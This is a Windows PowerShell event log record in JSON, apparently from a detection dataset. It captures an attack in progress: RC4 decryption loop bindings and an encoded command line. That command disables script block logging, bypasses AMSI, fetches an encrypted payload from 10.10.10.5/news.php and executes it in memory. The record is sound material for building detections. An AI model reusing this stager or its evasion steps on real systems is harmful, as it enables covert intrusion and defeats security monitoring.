{"Keywords":0,"SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":4103,"ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","ExecutionProcessID":5972,"Channel":"Microsoft-Windows-PowerShell/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ActivityID":"{3AF69DEC-79B4-0000-492D-2D856290D601}","UserID":"S-1-5-18","ThreadID":8112,"EventType":"INFO","Opcode":"To be used when operation is just executing a method","EventTime":"2020-09-22 04:22:43","@timestamp":"2020-09-22T08:22:44.450Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":213905,"Payload":"CommandInvocation(ForEach-Object): \"ForEach-Object\"\r\nParameterBinding(ForEach-Object): name=\"Begin\"; value=\"[long]$j=0;\"\r\nParameterBinding(ForEach-Object): name=\"Process\"; value=\"\n                        $j = ($j + $this.key[$($_ % $this.key.Length)] + $this.S[$_]) % $this.S.Length;\n                        $temp = $this.S[$_]; $this.S[$_] = $this.S[$j]; $this.S[$j] = $temp;\n                        \"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"0\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"1\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"2\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"3\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"4\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"5\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"6\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"7\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"8\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"9\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"10\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"11\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"12\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"13\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"14\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"15\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"16\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"17\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"18\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"19\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"20\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"21\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"22\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"23\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"24\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"25\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"26\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"27\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"28\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"29\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"30\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"31\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"32\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"33\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"34\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"35\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"36\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"37\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"38\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"39\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"40\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"41\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"42\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"43\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"44\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"45\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"46\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"47\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"48\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"49\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"50\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"51\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"52\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"53\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"54\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"55\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"56\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"57\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"58\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"59\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"60\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"61\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"62\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"63\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"64\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"65\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"66\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"67\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"68\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"69\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"70\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"71\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"72\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"73\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"74\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"75\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"76\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"77\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"78\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"79\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"80\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"81\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"82\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"83\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"84\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"85\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"86\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"87\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"88\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"89\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"90\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"91\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"92\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"93\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"94\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"95\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"96\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"97\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"98\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"99\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"100\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"101\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"102\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"103\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"104\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"105\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"106\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"107\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"108\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"109\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"110\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"111\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"112\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"113\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"114\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"115\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"116\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"117\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"118\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"119\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"120\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"121\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"122\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"123\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"124\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"125\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"126\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"127\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"128\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"129\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"130\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"131\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"132\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"133\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"134\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"135\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"136\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"137\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"138\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"139\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"140\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"141\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"142\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"143\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"144\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"145\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"146\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"147\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"148\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"149\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"150\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"151\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"152\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"153\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"154\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"155\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"156\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"157\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"158\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"159\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"160\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"161\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"162\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"163\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"164\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"165\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"166\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"167\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"168\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"169\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"170\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"171\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"172\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"173\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"174\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"175\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"176\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"177\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"178\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"179\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"180\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"181\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"182\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"183\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"184\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"185\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"186\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"187\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"188\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"189\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"190\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"191\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"192\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"193\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"194\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"195\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"196\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"197\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"198\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"199\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"200\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"201\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"202\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"203\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"204\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"205\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"206\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"207\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"208\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"209\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"210\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"211\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"212\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"213\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"214\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"215\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"216\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"217\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"218\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"219\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"220\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"221\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"222\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"223\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"224\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"225\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"226\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"227\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"228\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"229\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"230\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"231\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"232\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"233\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"234\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"235\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"236\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"237\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"238\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"239\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"240\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"241\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"242\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"243\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"244\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"245\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"246\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"247\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"248\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"249\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"250\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"251\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"252\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"253\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"254\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"255\"\r\n","Task":106,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":20,"SourceModuleName":"eventlog","ERROR_EVT_UNRESOLVED":true,"Severity":"INFO","ContextInfo":"        Severity = Informational\r\n        Host Name = Default Host\r\n        Host Version = 5.1.18362.752\r\n        Host ID = da6e33cf-5ea5-45e8-b75b-b0fc1487af33\r\n        Host Application = C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBJAE8AbgBUAEEAYgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0ARwBlACAAMwApAHsAJABBAEMARQA2AD0AWwByAEUAZgBdAC4AQQBzAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkAEEAYwBlADYAKQB7ACQANABjADAARAA9ACQAQQBjAGUANgAuAEcARQB0AFYAYQBMAFUAZQAoACQATgBVAEwAbAApADsASQBmACgAJAA0AGMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQANABjADAAZABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0AEMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAGwAPQBbAEMAbwBMAEwAZQBDAHQAaQBPAE4AcwAuAEcAZQBuAEUAUgBpAEMALgBEAEkAQwB0AEkAbwBOAEEAUgB5AFsAUwB0AFIAaQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBqAGUAQwBUAF0AXQA6ADoATgBlAHcAKAApADsAJABWAEEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAGEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADQAQwAwAGQAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAEwAfQBFAGwAUwBFAHsAWwBTAGMAcgBJAFAAVABCAEwAbwBDAEsAXQAuACIARwBFAFQARgBpAEUAYABMAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBsAFUAZQAoACQAbgBVAGwATAAsACgATgBlAFcALQBPAGIAagBFAEMAVAAgAEMATwBsAEwAZQBDAHQASQBPAG4AUwAuAEcARQBOAEUAcgBpAGMALgBIAGEAUwBoAFMAZQBUAFsAcwBUAFIASQBOAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAEUARgBdAC4AQQBzAHMARQBNAGIATAB5AC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAEUAVABGAGkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQAbgBVAEwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAFMAVABFAE0ALgBOAEUAVAAuAFMARQBSAFYASQBDAEUAUABvAEkAbgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQB4AHAAZQBjAFQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAMAA5ADcAQwA9AE4AZQBXAC0ATwBiAGoAZQBDAFQAIABTAHkAcwB0AGUATQAuAE4ARQBUAC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVAByAGkAbgBHACgAWwBDAG8ATgBWAEUAUgBUAF0AOgA6AEYAUgBPAG0AQgBhAHMAZQA2ADQAUwBUAFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADAAOQA3AEMALgBIAGUAQQBEAGUAUgBzAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAAwADkANwBjAC4AUABSAG8AeABZAD0AWwBTAHkAUwB0AGUAbQAuAE4AZQBUAC4AVwBlAGIAUgBFAHEAdQBFAHMAdABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAeQA7ACQAMAA5ADcAYwAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBuAFQAaQBhAEwAUwAgAD0AIABbAFMAWQBzAHQARQBtAC4ATgBFAFQALgBDAHIAZQBEAEUAbgB0AEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAEUARgBhAFUATAB0AE4ARQB0AHcAbwByAGsAQwByAGUAZABlAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADAAOQA3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAFQAZQBtAC4AVABFAFgAVAAuAEUATgBjAE8AZABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAHkAVABFAFMAKAAnADQARwBMAHkAXwA2ADwAKgBpAGYAcgA+AE0AVwB9AEkAKQBVAHAAdgB4AEAASwB1AFMAfgAzAGwAZABZADgAawAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkADAAOQA3AEMALgBIAEUAQQBkAGUAUgBzAC4AQQBEAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAG0AZABKAGYASAByAFUAPQBHAGgAagBOAGQAUABCADIATABEAE0ALwBpAG8ATgBXAFQAOABWAEkAVwBXAFcAaABOAGwAQQA9ACIAKQA7ACQARABBAHQAYQA9ACQAMAA5ADcAQwAuAEQATwBXAG4ATABPAEEARABEAGEAVABBACgAJABzAEUAUgArACQAdAApADsAJABpAHYAPQAkAGQAQQB0AEEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAGQAQQBUAEEALgBsAGUATgBHAHQASABdADsALQBKAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = 50f3d352-332d-4cc2-9811-b903295a8adb\r\n        Pipeline 